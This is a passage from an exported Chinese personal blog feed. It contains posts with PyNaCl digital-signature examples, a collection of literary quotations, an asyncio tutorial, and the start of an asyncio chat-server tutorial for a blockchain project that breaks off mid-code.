class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名使收件人没有怀疑文档真实性的余地。它们满足三个有用的声明：</p>
<ol>
<li>真实性：这可能只有发件人签名</li>
<li>完整性：这些数据不是伪造或篡改的。</li>
<li>不可否认性：发件人不能否认发送了数据</li>
</ol>
<p><img src="/2023/02/06/cryptography/image-20230206180052510.png" alt="image-20230206180052510"></p>
<ol>
<li>未加密的明文数据使散列的（防止篡改）</li>
<li>使用私钥对哈希进行加密。</li>
<li>将加密的哈希附加到（连接到）数据</li>
</ol>
<h3 id="进行签名的代码尝试"><a href="#进行签名的代码尝试" class="headerlink" title="进行签名的代码尝试"></a>进行签名的代码尝试</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line">b_privete_key = nacl.signing.SigningKey.generate()</span><br><span class="line">b_public_key = b_privete_key.verify_key</span><br><span class="line"></span><br><span class="line">b_public_key_hex = b_public_key.encode(encoder = nacl.encoding.HexEncoder)</span><br><span class="line"><span class="built_in">print</span>(b_public_key_hex)</span><br><span class="line"></span><br><span class="line">signed = b_privete_key.sign(<span class="string">b&quot;i love akali forever!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(signed)</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="string">b&#x27;01ac468e1b924e780331d8f81537c3db3af7362423fc930f8cec1bf0c094c145&#x27;</span>       <span class="string">b&#x27;T\xee\xaaj\x1e\xb0\xb0\xcao\xff\x00\xf8\xce\xa3X\xff\xcaDp4\xd6\xef\x91\xc1&#125;\xce\xbb\xb2\xa6~\xec\xe3\xd3\tM\xfbo\x08/\x89Q\xf7\x88\xb35R\x89_U4\xa6m\xb5\xfe\n2\xa0\x8cH\xf2\xa9[\x1b\x05i love akali forever!&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们发送了一条信息“i love akali forever”,构造一个数字签名，经过加密后可以看到发的信息是没有进行加密的，但是它填充了包含签名的字节</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line">b_public_key = <span class="string">b&#x27;01ac468e1b924e780331d8f81537c3db3af7362423fc930f8cec1bf0c094c145&#x27;</span></span><br><span class="line"></span><br><span class="line">verify_key = nacl.signing.VerifyKey(b_public_key,encoder=nacl.encoding.HexEncoder)</span><br><span class="line">signed_message = <span class="string">b&#x27;T\xee\xaaj\x1e\xb0\xb0\xcao\xff\x00\xf8\xce\xa3X\xff\xcaDp4\xd6\xef\x91\xc1&#125;\xce\xbb\xb2\xa6~\xec\xe3\xd3\tM\xfbo\x08/\x89Q\xf7\x88\xb35R\x89_U4\xa6m\xb5\xfe\n2\xa0\x8cH\xf2\xa9[\x1b\x05i love akali forever!&#x27;</span></span><br><span class="line"></span><br><span class="line">verify_key.verify(signed_message)</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line">无报错</span><br></pre></td></tr></table></figure>
<p>那如果对信息进行篡改，如去掉感叹号，可以看到报错是签名是伪造或损坏的</p>
<p><img src="/2023/02/06/cryptography/image-20230206210057771.png" alt="image-20230206210057771"></p>
<p><img src="/2023/02/06/cryptography/image-20230206210206173.png" alt="image-20230206210206173"></p>
<h2 id="区块链上的钱包"><a href="#区块链上的钱包" class="headerlink" title="区块链上的钱包"></a>区块链上的钱包</h2><p>上面的代码在某种程度上展现了以太坊的逻辑结构。<br>与比特币不同，以太坊是一个基于账户的模型——这意味着区块链上的每个“用户”都有一个账户。比特币没有<em>账户</em>的概念;相反，它是一个与现金流入和流出实体钱包的方式非常相似的系统。比特币系统被称为UTXO（未花费的交易输出），它是一种用于建模交易的优雅数据结构。但使用以太坊基于账户的模型。最初与以太坊交互时，通常做的第一件事就是生成一个密钥对。您的以太坊<em>地址</em>只是您的公钥。您的私钥存储在安全的地方，无论是在某种软件中还是在硬件钱包中。对于通过以太坊区块链向您发送资金的人，他们只需要知道您的公钥。但只有你可以访问这笔钱，因为只有你持有私钥。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>摘抄</title>
    <url>/2023/02/05/%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>愿中国青年都摆脱冷气，只是向上走，不必听自暴自弃者流的话。都做事的做事，能发声的发声。有一份热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等候炬火。此后如竟没有炬火：我便是唯一的光。</p>
<span id="more"></span>
<h2 id="名句"><a href="#名句" class="headerlink" title="名句"></a>名句</h2><p>“我们成功地拍到这张照片，仔细看，你会看见一个毫不起眼的小点，看那个光点，它就在这里，那是我们的家园，我们的一切。你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生。我们的欢乐与痛苦聚集在一起，数以千计的自以为是的宗教、意识形态和经济学说，所有的猎人与强盗、英雄与懦夫、文明的缔造者与毁灭者、国王与农夫、年轻的情侣、母亲与父亲、满怀希望的孩子、发明家和探险家、德高望重的教师、腐败的政客、超级明星、最高领袖、人类历史上的每一个圣人与罪犯，都住在这里——一粒悬浮在阳光中的微尘。在浩瀚的宇宙剧场里，地球只是一个极小的舞台，想想所有那些帝王将相杀戮得血流成河，他们的辉煌与胜利，曾让他们成为光点上一个部分的转眼即逝的主宰，想想栖身于这个点上的某个角落的居民，对别的角落几乎没有区别的居民所犯的无穷无尽的残暴罪行，他们的误解何其多也！他们多么急于相互残杀，他们的仇恨何其强烈。我们的心情，我们的妄自尊大，我们在宇宙中拥有某种特权地位的错觉，都受到这个苍白光点的挑战。在庞大的包容一切的暗黑宇宙中，我们的行星是一个孤独的斑点。由于我们的低微地位和广阔无垠的空间，没有任何暗示从别的什么地方会有救星来拯救我们脱离自己的处境。有人说：‘天文学令人感到自卑并能培养个性。’除了这张从远处拍摄的我们这个微小世界的照片，大概没有别的更好办法可以揭示人类妄自尊大是何等的愚蠢。对我来说，这强调说明我们有责任更友好地相处，并且要保护和珍惜这个淡蓝色的光点——这是我们迄今所知的唯一家园。”    ——卡尔·萨根</p>
<hr>
<p>有两种东西,我对它们的思考越是深沉和持久,他们在我心灵中唤起的惊奇和敬畏就会越来越历久弥新,一是我们头上浩瀚的星空,另一就是我们心中的道德律.”                ——康德</p>
<hr>
<h2 id="典籍"><a href="#典籍" class="headerlink" title="典籍"></a>典籍</h2><p>君子生非异也，善假与物也。    ——荀子</p>
<hr>
<p>智者不惑，仁者不忧，勇者不惧。    ——孔子《论语》</p>
<hr>
<p>好学近乎知，力行近乎仁，知耻近乎勇。    ——《礼记.中庸》</p>
<hr>
<p>战略上蔑视敌人，战术上重视敌人。    ——毛泽东 《关于目前党的政策中的几个重要问题》</p>
<hr>
<p>风起于青萍之末，浪成于微澜之间。</p>
<h2 id="散文"><a href="#散文" class="headerlink" title="散文"></a>散文</h2><p>远赴人间惊鸿宴席，一睹人间盛世颜。        ——《我在人间凑数的日子》</p>
<hr>
<p>愿中国青年都摆脱冷气，只是向上走，不必听自暴自弃者流的话。都做事的做事，能发声的发声。有一份热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等候炬火。此后如竟没有炬火：我便是唯一的光。倘若有了炬火，出了太阳，我们自然心悦诚服的消失。不但毫无不平，而且还要随喜赞美这炬火或太阳；因为他照了人类，连我都在内。        ——鲁迅    《热风》</p>
<h2 id="诗词"><a href="#诗词" class="headerlink" title="诗词"></a>诗词</h2><p>云想衣裳花想容，春风拂槛露华浓。<br>若非群玉山头见，会向瑶台月下逢。        ——[唐]李白    《清平调》</p>
<hr>
<p><strong>人生若只如初见，何事秋风悲画扇。</strong><br>等闲变却故人心，却道故人心易变。<br>骊山语罢清宵半，泪雨霖铃终不怨。<br>何如薄幸锦衣郎，比翼连枝当日愿。        ——清  纳兰性德    《木兰词》</p>
<hr>
<p>醉后不知天在水，满船清梦压星河。        ——[元]唐珙  《题龙阳县青草湖》</p>
<hr>
<p>少年侠气，交结五都雄。肝胆洞，毛发耸。立谈中，死生同。一诺千金重。        ——[宋]贺铸 《六州歌头·少年侠气》</p>
<hr>
<p>尔曹身与名俱灭，不废江河万古流。        ——杜甫    《戏为六绝句》</p>
<hr>
<p>待到秋来九月八，我花开后百花杀。<br>冲天香阵透长安，满城尽带黄金甲。        ——黄巢    《不第后赋菊》</p>
<h2 id="诗歌"><a href="#诗歌" class="headerlink" title="诗歌"></a>诗歌</h2><p>酒入豪肠，七分酿成了月光，<br>余下的三分啸成剑气，袖口一吐，就半个盛唐。        ——余光中    《寻李白》</p>
<hr>
<p>你要写洛阳，就不能只写洛阳</p>
<p>要写盛唐，写浮光<br>写这天下之众的攘攘与如霜</p>
<p>要写玉楼金阙拂衣裳，诗酒华章<br>写纸贵绝唱，写家书两行，<br>写一位陌上看花的冰心少年郎</p>
<p>写此夜玉笛声回荡，写满是京城牡丹香<br>再写白驹过隙梦黄粱，人世间茫茫</p>
<p>罢笔之时，欲晚天光<br>惊觉此身感秋凉，锦绣意气仍朗朗<br>当时只道是寻常</p>
<hr>
<h2 id="短篇小说"><a href="#短篇小说" class="headerlink" title="短篇小说"></a>短篇小说</h2><p>宇宙的最不可理解之处在于它是可以理解的。<br>宇宙的最可理解之处在于它是不可理解的。        ——《乡村教师》</p>
<hr>
<p>啊，地球，我的流浪地球！        —— 《流浪地球》</p>
<p>（说实在的，电影和小说都不错，但是我从电影中看到的是人类的赞歌就是勇气的赞歌，而在小说中，感受到的是深深的绝望）</p>
<hr>
<p>如果我爱你，而你也正巧爱我。你头发乱了时候，我会笑笑地替你拨一拨，然后，手还留恋地在你发上多待几秒。但是，如果我爱你，而你不巧地不爱我。你头发乱了，我只会轻轻地告诉你，你头发乱了喔。        ——村上春树    《如果我爱你》</p>
<hr>
<p>我告诉你我喜欢你，并不是一定要和你在一起，只是希望今后的你，在遭遇人生低谷的时候，不要灰心，至少曾经有人被你的魅力所吸引，曾经是，以后也是。        ——村上春树</p>
<hr>
<h2 id="长篇小说"><a href="#长篇小说" class="headerlink" title="长篇小说"></a>长篇小说</h2><h3 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h3><p>比起已经在风雨中成熟了许多的第一代红卫兵，新生的造反派们像火炭上的狼群，除了疯狂还是疯狂。</p>
<p>在中国，任何超脱飞扬的思想都会砰然坠地的，现实的引力太沉重了。</p>
<p>光锥之内就是命运</p>
<p>给岁月以文明，而不是给文明以岁月</p>
<p>死亡是唯一一座永远亮着的等他，不管你向哪里航行，最终都得转向它指引的方向。一切都会逝去，只有死神永生。</p>
<p>失去人性，失去很多；失去兽性，失去一切。</p>
<p>如果大山不会走向穆罕穆德，穆罕穆德可以走向大山。</p>
<p>弱小和无知不是生存的障碍，傲慢才是。</p>
<p>我们都是阴沟里的虫子，但总还是得有人仰望星空。</p>
<p>碑是那么小，与其说是为了纪念，更像是为了忘却。</p>
<p>毁灭你，与你有何相干？</p>
<hr>
<h3 id="龙族"><a href="#龙族" class="headerlink" title="龙族"></a>龙族</h3><p>总有一天，当孤独 的重量超过了极限，他就会崩塌，雪崩的狂潮会把整个世界的吞噬。</p>
<p>鼹鼠是见不得光的动物，在太阳下晒几个小时就会死掉。鼹鼠不能从黑暗里出来，只能偷偷的看着你。</p>
<p>眼前仿佛世界尽头，美得让人觉得那么孤单。</p>
<p>有些爱稍纵即逝，却铭心刻骨。他在命运里烧成灰烬，却在记忆里拔节生根。</p>
<p>我们都是小怪兽，终有一天将被正义的奥特曼打死。</p>
<p>我为我的正义活着，也为我的正义去死。</p>
<p>一切伟大时代皆会结束，正如所有的王都将死去。</p>
<hr>
<h3 id="夜的命名术"><a href="#夜的命名术" class="headerlink" title="夜的命名术"></a>夜的命名术</h3><p>永远少年        ——书评</p>
<p>人生当如蜡烛一样，从头燃到尾，始终光明。</p>
<p>攀那座山最终靠的不是技巧，而是落子无悔的勇气。</p>
<p>唯信仰与日月古不灭。</p>
<p>永远少年。</p>
<p>朋友会为你高兴，为你拼命，在那个肆无忌惮的年代，一起追风，一起做梦。</p>
<p>当命运给你选择的那一刻，你只需要选择倒下还是站起来，然后剩下的痛苦都不重要了。</p>
<p>若再许我少年时，一两黄金一两风。</p>
<p>我怕看见诚实的人被迫说谎，我怕正直的人被迫弯腰，我怕理想主义者看见理想破碎，我怕听见黄花连篇者的最后一句真话，我怕明哲保身者突然仗义执言，我怕曾理想背叛者，最终为理想而死。我怕看见懦夫最后的勇气，还有叛徒的冲锋。</p>
<p>生死关说起来玄妙，但其实很简单，不过就是赌上一次，把你的命交给这个世界罢了。攀一座山，看一场雪，在距离天空最近的地方，放声呐喊。</p>
<p>所以你要明白啊，我们不能用温柔去应对黑暗，要用火。</p>
<hr>
<h3 id="穷鬼的上下两千年"><a href="#穷鬼的上下两千年" class="headerlink" title="穷鬼的上下两千年"></a>穷鬼的上下两千年</h3><p>长生，呵，长生    ——书评</p>
<hr>
<p>固守己道，狭以成一。</p>
<hr>
<p>秦有灭赵之心，赵有亡秦之志。</p>
<hr>
<p>何为战？死千万人而全世人，为战。何为将？死一人，而全千万人为将。</p>
<hr>
<p>汉土不当分崩！汉人不当蒙难！诸侯不行，他曹操来。</p>
<hr>
<p>她不会成为那个走到终点，受万人瞩目，世代传颂的人，她能做的也只是那个站在路口，给每一个来人指出去路的人。<br>她希望这书院会是那路口，而路过的每一个人终将能，走到他们的终点，成就他们自己的所学所求。</p>
<hr>
<p>莫回头看了，我们是要迈着死路去的人，没后路可看的。</p>
<hr>
<p>夫胸抱负，非是五岳倒悬，如何得以立鼎？<br>夫胸抱负，非是黄河长逝，如何得以倾流？<br>夫胸抱负，非是天下宏图，如何得以明证？</p>
<hr>
<p>大风曾歌，威加海内。大汉之志，有谁记得？他曹操记得。<br>董卓挟汉，迁都长安。汉室衰微，有谁去追？他曹操去追。<br>天子东归，百官失所。兵败将离，有谁去迎？他曹操去迎。<br>半生汉臣，可此时拔剑四顾，他却成了汉贼······</p>
<hr>
<p>这善哉是佛门告罪之语，也不知道这时他是在为何而告罪。</p>
<hr>
<p>此去，他要去问明佛心，问明佛意，问明七情六欲，问明因果报应，问明他心中的一个佛字。</p>
<hr>
<p>亦意为，了然世事，悟得皆空，不执于喜怒，不执于哀乐，不执于生老，不执于病死，得以超脱，是为悟空。</p>
<hr>
<p>一两声鸟鸣回响，是林中空空，山中空空，可顾楠最悟不出的，便是这空空。</p>
<hr>
<p>为何会苦呢？这明明已经是一个盛世了。或许大多数的人生本来就是苦的，而这世上，也从没有万全的世道。</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>爱好</tag>
      </tags>
  </entry>
  <entry>
    <title>asyncio——异步I/O</title>
    <url>/2023/02/03/asyncio%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5I-O/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>asyncio库的学习</p>
<span id="more"></span>
<p>asyncio 是用来编写 <strong>并发</strong> 代码的库，使用 <strong>asysnc/await</strong> 语法。</p>
<p>asyncio 被用作多个提供高性能 Python 异步框架的基础，包括网络和网站服务，数据库连接库，分布式任务队列等等。</p>
<p>asyncio 往往是构建 IO 密集型和高层级 <strong>结构化</strong> 网络代码的最佳选择。</p>
<p>asyncio 提供一组 <strong>高层级</strong> API 用于:</p>
<ul>
<li>并发地 <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html#coroutine">运行 Python 协程</a> 并对其执行过程实现完全控制;</li>
<li>执行 <a href="https://docs.python.org/zh-cn/3/library/asyncio-stream.html#asyncio-streams">网络 IO 和 IPC</a>;</li>
<li>控制 <a href="https://docs.python.org/zh-cn/3/library/asyncio-subprocess.html#asyncio-subprocess">子进程</a>;</li>
<li>通过 <a href="https://docs.python.org/zh-cn/3/library/asyncio-queue.html#asyncio-queues">队列</a> 实现分布式任务;</li>
<li><a href="https://docs.python.org/zh-cn/3/library/asyncio-sync.html#asyncio-sync">同步</a> 并发代码;</li>
</ul>
<p>此外，还有一些 <strong>低层级</strong> API 以支持 <em>库和框架的开发者</em> 实现:</p>
<ul>
<li>创建和管理 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio-event-loop">事件循环</a>，以提供异步 API 用于 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.loop.create_server"><code>网络化</code></a>, 运行 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.loop.subprocess_exec"><code>子进程</code></a>，处理 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.loop.add_signal_handler"><code>OS 信号</code></a> 等等;</li>
<li>使用 <a href="https://docs.python.org/zh-cn/3/library/asyncio-protocol.html#asyncio-transports-protocols">transports</a> 实现高效率协议;</li>
<li>通过 async/await 语法 <a href="https://docs.python.org/zh-cn/3/library/asyncio-future.html#asyncio-futures">桥接</a> 基于回调的库和代码。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Suspending a&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Resuming a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">## asyncio.gather用来并发运行任务，这里表示协同的执行a和b两个协程</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(a(), b())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/03/asyncio%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5I-O/image-20230203195817350.png" alt="image-20230203195817350"></p>
<p>可以看到在并发执行过程中，协程a被挂起又恢复</p>
<p>注意：协程要用async def 声明，await asyncio.sleep(0)，await表示调用协程，sleep 0 不会真的sleep（因为时间为0），但是却可以把控制权交出去了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello ...&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;... World!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/03/asyncio%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5I-O/image-20230203195100934.png" alt="image-20230203195100934"></p>
<h2 id="交互式会话举例"><a href="#交互式会话举例" class="headerlink" title="交互式会话举例"></a>交互式会话举例</h2><p><img src="/2023/02/03/asyncio%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5I-O/image-20230203194943931.png" alt="image-20230203194943931"></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>python库</tag>
      </tags>
  </entry>
  <entry>
    <title>networking</title>
    <url>/2023/02/03/networking/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>构建区块链的第四步——建立网络的连接</p>
<span id="more"></span>
<p>在python中，利用并发性，完成区块链通常需要一次执行许多操作的需求。<br>处理并发的方法有很多，最流行的两种是<strong>线程</strong>或<strong>完全并行的进程</strong>。在这里使用<strong>协作式多任务处理</strong>（简称为“异步”）。</p>
<p>在python中异步编程由asyncio库提供便利。</p>
<p>异步编程 通过足够快地暂停和恢复来实现，以便程序<em>看起来像</em>是并行运行。但实际上，它只是简单地在不同的命令之间快速切换，并在切换到另一个命令之前计算每个命令的一小块。这有点像切蔬菜丁，除了不是完全切洋葱然后转到土豆，而是切一点洋葱，然后切一些土豆，反之亦然，直到两者都切成薄片。</p>
<h2 id="异步函数"><a href="#异步函数" class="headerlink" title="异步函数"></a>异步函数</h2><p>异步函数是指通过实践循环异步执行的函数，他会通过一个隐式的promise返回其结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello ...&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;... World!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello ...</span><br><span class="line"><span class="meta">... </span>World!</span><br><span class="line">可以明显感觉到程序运行停滞了一秒</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Suspending a&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Resuming a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(a(), b())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">Suspending a</span><br><span class="line">In b</span><br><span class="line">Resuming a</span><br><span class="line">可以很明显看出来a中间停了，运行完b才继续运行a</span><br></pre></td></tr></table></figure>
<h3 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h3><p>promise对象用于表示一个异步操作的最终完成（或失败）及其结果值。一个 <code>Promise</code> 对象代表一个在这个 <code>promise</code> 被创建出来时不一定已知的值。它让您能够把异步操作最终的成功返回值或者失败原因和相应的处理程序关联起来。 这样使得异步方法可以像同步方法那样返回值：异步方法并不会立即返回最终的值，而是会返回一个 <code>promise</code>，以便在未来某个时候把值交给使用者。</p>
<p>一个 <code>Promise</code> 必然处于以下几种状态之一：</p>
<ul>
<li><em>待定（pending）</em>: 初始状态，既没有被兑现，也没有被拒绝。</li>
<li><em>已兑现（fulfilled）</em>: 意味着操作成功完成。</li>
<li><em>已拒绝（rejected）</em>: 意味着操作失败。</li>
</ul>
<h2 id="asyncio的工作原理"><a href="#asyncio的工作原理" class="headerlink" title="asyncio的工作原理"></a>asyncio的工作原理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">greet</span> (name,delay):</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(delay)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>:I wait <span class="subst">&#123;delay&#125;</span> seconds before saying &quot;hello&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    task_1 = asyncio.create_task(greet(<span class="string">&quot;t1&quot;</span>,<span class="number">3</span>))</span><br><span class="line">    task_2 = asyncio.create_task(greet(<span class="string">&quot;t2&quot;</span>,<span class="number">2</span>))    </span><br><span class="line">    task_3 = asyncio.create_task(greet(<span class="string">&quot;t3&quot;</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0.00s: Program Start&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> task_1</span><br><span class="line">    <span class="keyword">await</span> task_2</span><br><span class="line">    <span class="keyword">await</span> task_3</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;time.time() - start_time:<span class="number">.2</span>f&#125;</span>s:Program End&quot;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="number">0.00</span>s: Program Start</span><br><span class="line">t2:I wait <span class="number">2</span> seconds before saying <span class="string">&quot;hello&quot;</span></span><br><span class="line">t3:I wait <span class="number">2</span> seconds before saying <span class="string">&quot;hello&quot;</span></span><br><span class="line">t1:I wait <span class="number">3</span> seconds before saying <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="number">3.00</span>s:Program End</span><br><span class="line">可以看到，异步运行只用了三秒，而同步运行需要七秒。</span><br></pre></td></tr></table></figure>
<h2 id="构建聊天服务器"><a href="#构建聊天服务器" class="headerlink" title="构建聊天服务器"></a>构建聊天服务器</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> textwrap <span class="keyword">import</span> dedent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConnectionPool</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        self.connection_pool = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_welcome_message</span>(<span class="params">self, writer</span>):</span><br><span class="line">        message = dedent(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        ( Welcome <span class="subst">&#123;writer.nickname&#125;</span>!</span></span><br><span class="line"><span class="string">        There are <span class="subst">&#123;<span class="built_in">len</span>(self.connection_pool) - <span class="number">1</span>&#125;</span> user(s) here beside you</span></span><br><span class="line"><span class="string">        Help:</span></span><br><span class="line"><span class="string">         - Type anything to chat</span></span><br><span class="line"><span class="string">         - /list will list all the connected users</span></span><br><span class="line"><span class="string">         - /quit will disconnect you</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        writer.write(<span class="string">f&quot;<span class="subst">&#123;message&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast</span>(<span class="params">self, writer, message</span>):</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user != writer:</span><br><span class="line">                <span class="comment"># We don&#x27;t need to also broadcast to the user sending the message</span></span><br><span class="line">                user.write(<span class="string">f&quot;<span class="subst">&#123;message&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast_user_join</span>(<span class="params">self, writer</span>):</span><br><span class="line">        self.broadcast(writer, <span class="string">f&quot;<span class="subst">&#123;writer.nickname&#125;</span> just joined&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast_user_quit</span>(<span class="params">self, writer</span>):</span><br><span class="line">        self.broadcast(writer, <span class="string">f&quot;<span class="subst">&#123;writer.nickname&#125;</span> just quit&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast_new_message</span>(<span class="params">self, writer, message</span>):</span><br><span class="line">        self.broadcast(writer, <span class="string">f&quot;[<span class="subst">&#123;writer.nickname&#125;</span>] <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_users</span>(<span class="params">self,writer</span>):</span><br><span class="line">        message = <span class="string">&quot;===\n&quot;</span></span><br><span 